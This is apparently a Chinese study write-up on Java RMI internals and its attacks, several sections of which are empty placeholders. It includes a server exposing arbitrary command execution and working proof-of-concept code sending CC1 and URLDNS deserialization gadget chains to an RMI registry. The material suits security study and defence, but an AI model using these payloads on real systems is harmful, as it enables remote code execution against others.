## RMI相关知识总结

### 介绍

* RMI简介：远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，例如CORBA、WebService，这两种是独立于编程语言的。而Java RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。

* RMI的使用场景：

> 假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。

* RMI由三部分组成：
  * RMI Server 服务端
  * RMI Client 客户端

  * RMI Register RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name 到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。

### 代码示例

Server由三部分构成：

*  ⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()

```java
package com.individuals.RMIServer;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteHelloWorld extends Remote {
    public String hello() throws RemoteException;
}

```

* ⼀个实现了此接⼝的类

```java
package com.individuals.RMIServer;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteHelloWorld extends UnicastRemoteObject implements
        IRemoteHelloWorld {
    protected RemoteHelloWorld() throws RemoteException {
        super();
    }
    public String hello() throws RemoteException {
        System.out.println("call from");
        return "Hello world666666";
    }
}
```

* ⼀个主类，⽤来创建Registry，并将上⾯的类实例化后绑定到⼀个地址。这就是我们所谓的Server 了

```java
package com.individuals.RMIServer;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}

```

客户端较为简单，但是有两点需要注意：

- 使用了继承了 java.rmi.Remote 的接⼝
- 使用Naming.lookup进行查找

```java
package com.individuals.RMIClient;

import com.individuals.RMIServer.IRemoteHelloWorld;
import java.rmi.Naming;
public class TrainMain {
    public static void main(String[] args) throws Exception {
        IRemoteHelloWorld hello = (IRemoteHelloWorld)
                Naming.lookup("rmi://192.168.201.109:1099/Hello");
        String ret = hello.hello();
        System.out.println(ret);
        System.out.println("over!");
    }
}

```

Register在刚刚的例子中，存在感不强，因为通常我们在新建一个RMI Registry的时候，都会 直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分

```java
LocateRegistry.createRegistry(1099);
Naming.rebind("rmi://127.0.0.1:1099/Hello", h);
```

如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 

 ```java
LocateRegistry.createRegistry(1099);
Naming.rebind("Hello", h);
 ```

如果将Register和Server分开，可以将上面的代码更改为如下：

```java
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {

    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        // LocateRegistry.createRegistry(1099);
        Naming.rebind("rmi://ip:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
```

```java
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Register {
    public static void main(String[] args) throws RemoteException, InterruptedException {
        Registry registry =  LocateRegistry.createRegistry(1099);
        System.out.println("RMI registry started on port 1099");

        // 保持程序运行
        synchronized (Register.class) {
            Register.class.wait();
        }
    }
}
```

这里分布式部署Register和Server氛围两种情况，1.两者处于不同服务器和不同JVM；2.两者处于统一服务器的同一JVM

### RMI的远程调用过程

* 远程方法调用过程中参数的传递和结果的返回：参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。
* 远程对象和非远程对象：远程对象是实现了 `java.rmi.Remote` 接口的对象，就是Client执行远程方法需要调用的对象；非远程对象是没有实现 `java.rmi.Remote` 接口的对象，在RMI中一般指的是远程方法调用中的参数和返回值。
* RMI对远程对象和非远程对象的处理方式是不一样的，非远程对象直接以序列化进行传递，远程对象没有被直接传递，而是借助Stub和Skeleton完成远程调用。
* Stub和Skeleton：Client在`Naming.lookup`向Register查找远程对象时，Register通过JRMI协议发送给了Client一些必要的数据，这些数据作为Client端Stun的参数，Stub基本上相当于是远程对象的引用或者代理（Java RMI使用到了代理模式）。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：

![image-20240808145051814](./images/image-20240808145051814.png)

* 从逻辑上来说，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的：
  1. Server端监听一个端口，这个端口是JVM随机选择的；
  2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；
  3. Client端可以调用Stub上的方法；
  4. Stub连接到Server端监听的通信端口并提交参数；
  5. 远程Server端上执行具体的方法，并返回结果给Stub；
  6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；
* Regiter和Server的通信：上述的远程调用过程是Client如何调用Server上的方法，但是Client的Stun需要来自Register的一些数据，而Register的Stun则需要来自于Server的一些数据，当Server实现远程接口的类rebind到Register时，它将会向Register发送Stun所必须的数据。
* **RMI的传输是基于序列化的**

### JRMP

**JRMP**：Java Remote Message Protocol ，Java 远程消息交换协议。这是运行在Java RMI之下、TCP/IP之上的线路层协议。该协议要求服务端与客户端都为Java编写，就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。

需要指出的是Weblogic采用的是T3协议传而非JRMI协议进行RMI通信。

## 对RMI的几种攻击

### 攻击存在危险方法的RMI Server

#### 限制

#### 攻击原理

* 远程方法实际上还是在Server上执行的，如果Server本身存在危险方法，则Client可以通过该危险方法主动攻击Server

示例代码如下

```java
// register
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Register {
    public static void main(String[] args) throws RemoteException, InterruptedException {
        Registry registry =  LocateRegistry.createRegistry(1099);
        System.out.println("RMI registry started on port 1099");

        // 保持程序运行
        synchronized (Register.class) {
            Register.class.wait();
        }
    }
}
```

```java
// server
import java.lang.reflect.InvocationTargetException;
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface DangeriousFunc1 extends Remote {
    public void exec(String cmd) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException;
}

import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

// CmdServer的远程方法exec可以接收任意命令并执行
public class CmdServer extends UnicastRemoteObject implements DangeriousFunc1 {
    protected CmdServer() throws RemoteException {
    }

    @Override
    public void exec(String cmd) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 获取Runtime类
        Class<?> clazz = Class.forName("java.lang.Runtime");
// 获取Runtime的方法exec(String str)
        Method execMethod = clazz.getMethod("exec", String.class);
// 获取Rumtime的方法getRuntime()
        Method getRuntimeMethod = clazz.getMethod("getRuntime");
// 执行Runtime.getRuntime()，获取对象runtime
        Object runtime = getRuntimeMethod.invoke(clazz);
// 执行runtime.exec("calc.exe")
        execMethod.invoke(runtime, cmd);
    }

    public static void main(String[] args) throws RemoteException, MalformedURLException {
        CmdServer cmdServer = new CmdServer();
        String host = "rmi://127.0.0.1:1099/";
        Naming.rebind(host+"Cmd", cmdServer);
    }
}
```

```java
// client
import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class AttackDangerServer {
    public static void main(String[] args) throws MalformedURLException, NotBoundException, RemoteException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        DangeriousFunc1 dangeriousFunc1 = (DangeriousFunc1) Naming.lookup("rmi://127.0.0.1:1099/Cmd");
        dangeriousFunc1.exec("calc.exe");
    }
}
```

* 攻击的关键点在于如何探测危险方法，利用工具 BaRMIe [NickstaDB/BaRMIe: Java RMI enumeration and attack tool. (github.com)](https://github.com/NickstaDB/BaRMIe)可以探测目标RMI服务提供的远程对象和其父类

![image-20240809115312759](./images/image-20240809115312759.png)

#### 攻击方法

* 通过目标的公开文档或者相关工具探测危险方法
* 客户端调用远程危险方法

### 对于RMI的Register进行反序列化攻击(CVE-2017-3241  Java RMI Registry.bind() Unvalidated Deserialization)

前面说过，RMI的传输是基于序列化的，Client和Register、Client和Server、Server和Register的交互都存在序列化和反序列化的操作，所以在反序列化的过程中就可能会存在反序列化攻击

#### Server攻击Register

#### 限制

* 在jdk8u 之前

#### 攻击原理

当我们将Register和Server部署在不同JVM上时，Server在bind远程对象到Register时，会发送Stun到Register，而这个过程中存在反序列化的操作。

```java
// register
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Register {
    public static void main(String[] args) throws RemoteException, InterruptedException {
        Registry registry =  LocateRegistry.createRegistry(1099);
        System.out.println("RMI registry started on port 1099");

        // 保持程序运行
        synchronized (Register.class) {
            Register.class.wait();
        }
    }
}
```

```java
import org.example.remoteInterface.DangeriousFunc1;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class CmdServer extends UnicastRemoteObject implements DangeriousFunc1 {
    protected CmdServer() throws RemoteException {
    }

    @Override
    public void exec(String cmd) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        // 获取Runtime类
        Class<?> clazz = Class.forName("java.lang.Runtime");
// 获取Runtime的方法exec(String str)
        Method execMethod = clazz.getMethod("exec", String.class);
// 获取Rumtime的方法getRuntime()
        Method getRuntimeMethod = clazz.getMethod("getRuntime");
// 执行Runtime.getRuntime()，获取对象runtime
        Object runtime = getRuntimeMethod.invoke(clazz);
// 执行runtime.exec("calc.exe")
        execMethod.invoke(runtime, cmd);
    }

    public static void main(String[] args) throws RemoteException, MalformedURLException {
        CmdServer cmdServer = new CmdServer();
        // ip为开启register的服务器
        String host = "rmi://ip:1099/";
        Naming.rebind(host+"Cmd", cmdServer);
    }
}

```

还是之前的例子，但是将server与register分开在不同部署，运行程序，发现server报错

![f362282d4d41403879779be216e36fc8](./images/f362282d4d41403879779be216e36fc8.png)

这个异常产生的原因是，register侧检测到进行rebind或者bind操作的ip不是本地ip，默认情况下拒绝进行该操作。对该异常产生的原因进行追溯，抛出异常的代码在RegistryImpl的checkAccess方法中，但是在进一步追溯AccessController.doPrivileged的过程中，发现该方法为Native方法，遂放弃追溯

![image-20240813105140989](./images/image-20240813105140989.png)

但是在网上查阅了众多资料后，发现Register并不支持非本地ip进行bind、rebind等操作，但是也有一些资料中指出，通过一些配置可以使得register支持远程server绑定，这里暂时搁置，待后续补充。

##### 配置register支持远程server

后续补充

##### 低于jdk8u121版本下的攻击

使用wireshark抓包，查看server bind到Register时发送的报文：

![image-20240813105804667](./images/image-20240813105804667.png)

![image-20240813105816758](./images/image-20240813105816758.png)

正如我们之前所说，在server bind到register时，会发送stun所必须的数据到register，发送的过程是基于序列化的，这里也可以看到报文中存在序列化对象，而register也有响应报文，里面也包含了一个序列化对象。我们对register进行攻击的基本原理是，发送恶意的序列化对象到register。

我们这里暂时先不顾不同IP下不能进行bind的问题，先查看一下register对于stun的反序列化过程。通过返回的异常对象，可以查看到register的调用栈，我们这里定位到register的sun.rmi.registry.RegistryImpl_Skel.dispatch。**但是注意这里所使用的jdk版本为8u66，小于8u121。**

![image-20240813114959775](./images/image-20240813114959775.png)

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
        if (var4 != 4905912898345647071L) {
            throw new SkeletonMismatchException("interface hash mismatch");
        } else {
            RegistryImpl var6 = (RegistryImpl)var1;
            String var7;
            Remote var8;
            ObjectInput var10;
            ObjectInput var11;
            switch (var3) {
                case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var94) {
                        throw new UnmarshalException("error unmarshalling arguments", var94);
                    } catch (ClassNotFoundException var95) {
                        throw new UnmarshalException("error unmarshalling arguments", var95);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.bind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var93) {
                        throw new MarshalException("error marshalling return", var93);
                    }
                case 1:
                    var2.releaseInputStream();
                    String[] var97 = var6.list();

                    try {
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }
                case 2:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var8 = var6.lookup(var7);

                    try {
                        ObjectOutput var9 = var2.getResultStream(true);
                        var9.writeObject(var8);
                        break;
                    } catch (IOException var88) {
                        throw new MarshalException("error marshalling return", var88);
                    }
                case 3:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.rebind(var7, var8);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }
                case 4:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }

                    var6.unbind(var7);

                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var80) {
                        throw new MarshalException("error marshalling return", var80);
                    }
                default:
                    throw new UnmarshalException("invalid method number");
            }

        }
    }
```

这个 `dispatch` 的代码逻辑很简单，用于处理 RMI 调用，执行基于方法编号的操作。从case 0到case 4，可以看到rmi中的bind、list、lookup、rebind和unbind等操作。我们可以看到每个case下的操作逻辑都是类似的，都是先进行了反序列化操作，然后在进行bind、list等操作，结合异常抛出信息，我们发现，异常的抛出是在反序列化之后，所以即使远端server绑定到register会抛出异常，但是并不影响我们的反序列化攻击。

根据之前抓到的报文，可以推测这里序列化的对象大概率就是server发送过来的stun对象，但是我们还是得追溯一下代码确定一下。

查看之前的抛出的异常，我们定位到RegistryImpl_Stub.rebind，查看序列化对象是如何被发送出的。

![image-20240813145028479](./images/image-20240813145028479.png)

```java
public void rebind(String var1, Remote var2) throws AccessException, RemoteException {
        try {
            RemoteCall var3 = super.ref.newCall(this, operations, 3, 4905912898345647071L);

            try {
                ObjectOutput var4 = var3.getOutputStream();
                var4.writeObject(var1);
                var4.writeObject(var2);
            } catch (IOException var5) {
                throw new MarshalException("error marshalling arguments", var5);
            }

            super.ref.invoke(var3);
            super.ref.done(var3);
        } catch (RuntimeException var6) {
            throw var6;
        } catch (RemoteException var7) {
            throw var7;
        } catch (Exception var8) {
            throw new UnexpectedException("undeclared checked exception", var8);
        }
    }
```

这里有明显的序列化操作，在同一个输出流中序列化了两个对象，我们为该方法打上断点

![image-20240813155528650](./images/image-20240813155528650.png)

传入的第一个参数为rebind所绑定到的Path，第二个参数则为我们的远程对象。这里由于笔者的java水平有限，就不继续追溯server侧的代码了，我们对wireshark抓取的报文进行分析，也能印证之前的想法

![image-20240813155836910](./images/image-20240813155836910.png)

让我们查看发送的序列化对象，可以看到我们写入的两个对象

![image-20240813155948416](./images/image-20240813155948416.png)

我们再回到register侧，在sun.rmi.registry.RegistryImpl_Skel.dispatch打上断点，查看传入的参数是怎么样的

![image-20240813162505688](./images/image-20240813162505688.png)

第一个参数是一个远程对象，代表服务器端的实现对象。在这个方法中，它被转换为 `RegistryImpl` 对象（`RegistryImpl var6 = (RegistryImpl)var1;`）。`RegistryImpl` 是 RMI 注册表的实现类，负责管理远程对象的绑定、查找等操作。这个对象并非server侧传输而来。

第二个参数即对应server侧`RemoteCall var3 = super.ref.newCall(this, operations, 3, 4905912898345647071L);`

第三四个参数，则对应server侧，RemoteCall对象中传入的3和4905912898345647071L。

###### 常见gadget链的攻击

使用CC1攻击的poc代码如下

```java
import org.example.payload.CC1;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;

public class CC1AtackRegister  {
    public static void main(String[] args) throws RemoteException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        // CC1.getObject()返回值是CC1的恶意对象
        InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
        // 由于rebind的参数类型的限制，这里需要在恶意对象外包裹一层Remote
        // 因为CC1的恶意对象实现了接口InvocationHandler，这里可以使用动态代理的方式将其封装
        // 因为反序列化存在传递性，当proxyEvalObject被反序列化时，evalObject也会被反序列化，自然也会执行poc链
        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
        String host = "rmi://192.168.110.146:1099/";
        Naming.rebind(host+"CC1", proxyEvalObject);
    }
}
```

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static Object getObject() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new
                        Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new
                        Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {
                                "calc.exe" }),
        };

        Transformer transformerChain = new
                ChainedTransformer(transformers);

        Map innerMap = new HashMap();

        // new
        innerMap.put("value", "xxxx");
        // new

        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);

        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Object obj = construct.newInstance(Retention.class, outerMap);
        return obj;
    }

}
```

从CC1的poc代码可以看出，构建poc代码的一个关键点在于如何将我们的恶意对象包装为实现了Remote接口的类，CC1由于本身的特殊性，最终生成的对象实现了InvocationHandler接口，借助动态代理可以很容易的包装为任意类。其他没有利用AnnotationInvocationHandler的gadget链如何包装了，这里我们可以借鉴ysoserial的做法，它其实也是使用了Annot

ationInvocationHandler将我们生成的恶意对象又包装了一层。以URLDNS为例，poc代码如下:

```java
import org.example.payload.URLDNS;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

public class URLDNSAttackRegister {
    public static void main(String[] args) throws Exception {
        String url = "";
        HashMap obj = (HashMap) new URLDNS().getObject(url);

        Map<String, Object> map = new HashMap<String, Object>();
        map.put("DNSURL", obj);

        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,
                Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                construct.newInstance(Override.class, map);
        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, handler);
        String host = "rmi://192.168.110.146:1099/";
        Naming.rebind(host+"URLDNS", proxyEvalObject);
    }
}
```

##### jdk8u121<=version<jdk8u141

如果启动register服务的jdk版本为8u121，我们仍然使用之前的poc进行攻击，发现攻击失败，而且返回的异常信息和之前也不同。

这是低于8u121时返回的异常，按照我们之前的分析，我们在异常抛出之前就完成了反序列化，不影响我们的攻击：

![image-20240815164554555](./images/image-20240815164554555.png)

这是8u121时返回的异常，RMI Registry侧输出了`ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs: 6, depth: 2, bytes: 285, ex: n/a`

![image-20240815164817438](./images/image-20240815164817438.png)

这里的异常信息中出现了`at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1244)`，`filterCheck` 方法用于检查对象的序列化过滤器，以确保反序列化过程符合安全策略，很明显这里的反序列化的过程中，有些对象被过滤了，这是为什么呢？原因是在以下几个java版本开始，引入了JEP290：

- Java™ SE Development Kit 8, Update 121 (JDK 8u121)
- Java™ SE Development Kit 7, Update 131 (JDK 7u131)
- Java™ SE Development Kit 6, Update 141 (JDK 6u141)

###### JEP290

JEP290是来限制能够被反序列化的类，主要包含以下几个机制：

1. 提供一个限制反序列化类的机制，白名单或者黑名单。
2. 限制反序列化的深度和复杂度。
3. 为RMI远程调用对象提供了一个验证类的机制。
4. 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。

JEP290需要手动设置，只有设置了之后才会有过滤，没有设置的话就还是可以正常的反序列化漏洞利用，所以之后介绍的针对Client端和Server端的某些序列化攻击没有被限制。

JEP可以通过以下几种方式设置：

1. JVM时的参数设置
2. 代码设置全局过滤器
3. 通过代码为特定的ObjectInputStream设置过滤器
4. 配置文件设置

###### jdk8u121中的为RMI的特定代码设置过滤器

jdk8u121中，是通过上述的方法3来修复RMI的反序列化漏洞，这里很粗略地分析一下这个过程。

`RegistryImpl`类的构造函数处可以看到，Register::registerFilter即是该版本新增的反序列化过滤器，这个过滤器后面再具体分析

![image-20240815200237765](./images/image-20240815200237765.png)

继续追溯，UnicastServerRef的filter属性获取了这个过滤器

![image-20240815200538329](./images/image-20240815200538329.png)

![image-20240815200640864](./images/image-20240815200640864.png)

我们定位到之前攻击时返回的异常调用栈中的UnicastServerRef.oldDispatch

![image-20240815201124115](./images/image-20240815201124115.png)

![image-20240815201958993](./images/image-20240815201958993.png)

在我们触发反序列化操作的函数之前，有一行代码`this.unmarshalCustomCallData(var18);`，跟进去看，发现设置了反序列化过滤器

![image-20240815201629692](./images/image-20240815201629692.png)

###### 绕过反序列化过滤器进行攻击

##### jdk8u141<=version<jdk8u231

##### jdk8u231<=version<jdk8u241

#### 攻击方法

##### 8u121之前可直接使用ysoserial的RMIRegistryExploit进行攻击

#### Client攻击Register

#### 限制

#### 攻击原理

#### 攻击方法

### 对于RMI的Client和Server的反序列化攻击

* Register攻击Client
  * reference

* Server攻击Client
* Client攻击Server

### 动态加载类攻击

#### 对于register的攻击

#### 对于server的攻击

#### 对于client的攻击

## 借助BaRMIe对RMI进行攻击

## Ysoserial的RMI相关payload分析

## 参考

